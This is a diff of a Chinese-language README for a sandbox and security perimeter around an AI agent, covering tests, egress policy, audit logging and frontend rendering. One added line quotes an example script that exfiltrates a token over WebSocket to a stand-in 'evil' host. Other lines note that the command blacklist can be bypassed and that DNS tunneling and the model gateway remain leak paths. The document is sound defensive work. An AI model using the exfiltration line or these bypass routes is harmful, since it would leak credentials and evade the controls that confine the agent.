@@ -26,7 +26,7 @@ npm install && npm run demo
 演示用 mock 模型端点，**不需要任何 API key、不需要外网**。这既是钩子测试的前提，也是策略文档要求的「演示环境挂掉时的保险」。接真实模型：`PERIMETER_DEMO_REAL=1 npm run demo`，并按 pi 的常规方式配好 provider。
 
 ```bash
-npm test          # 324 个测试
+npm test          # 330 个测试
 npm run typecheck
 npm run gen:deploy  # 从 config/policy.yaml 重新生成 NetworkPolicy 与策略 ConfigMap
 ```
@@ -135,6 +135,7 @@ docker 后端的实测结论（`tests/docker-backend.test.ts`，无 docker 时�
 - **命令黑名单是启发式，不是安全边界。** shell 的求值方式（变量展开、base64、别名、间接调用）注定它可被绕过。真边界是 egress 默认 deny + 凭据不进沙箱 + 每会话独占沙箱 —— 后两条在 docker 后端下已成立，egress 那条仍取决于部署（见上）。`tests/redteam.test.ts` 里有一条测试**刻意断言黑名单拦不住**。
 - **egress allowlist 即便部署了，也只杀掉「直连任意外部主机」这一类外泄。** 生成的策略必须放通 DNS（否则内部主机名都解析不了），DNS 隧道仍然可行；经模型网关的请求体本身也是一条合法外泄通道（凭据检测是 audit-only，不阻断不改写）。
 - **哈希链防的是意外损坏与粗糙篡改，不防有文件写权限的攻击者** —— 那种攻击者能从头重算整条链，也能截断尾部。要升级为防恶意篡改需要外部锚点（链头是纯元数据，可以出 Data Plane），`AuditLog.verify(path, expectedHead)` 已留入口，上报由部署侧接。安全白皮书里必须同口径表述，不要写成「防篡改」。
+- **前端渲染的全部内容都是 agent 可控的**（模型输出、工具结果、命令原文）。一律走 `textContent`，不用 `innerHTML`/`eval`，CSP 限同源且 `connect-src` 不含 `ws:`/`wss:` 这类 scheme-source —— 后者匹配任意主机，注入的脚本一句 `new WebSocket("wss://evil/?t="+location.search)` 就能把 URL 里的 token 送走。这些性质由 `tests/web-injection.test.ts` 锁住（`web/` 是零构建原生 JS，类型系统与 lint 都够不着）。
 - **PII/secret 检测只做 audit-only**（检测 + 告警，不改写流）。对代码流做正则/熵改写误伤率高，会直接破坏生成质量；阻断模式要等有真实误报数据再上。
 
 ## Phase 2 迁移成本
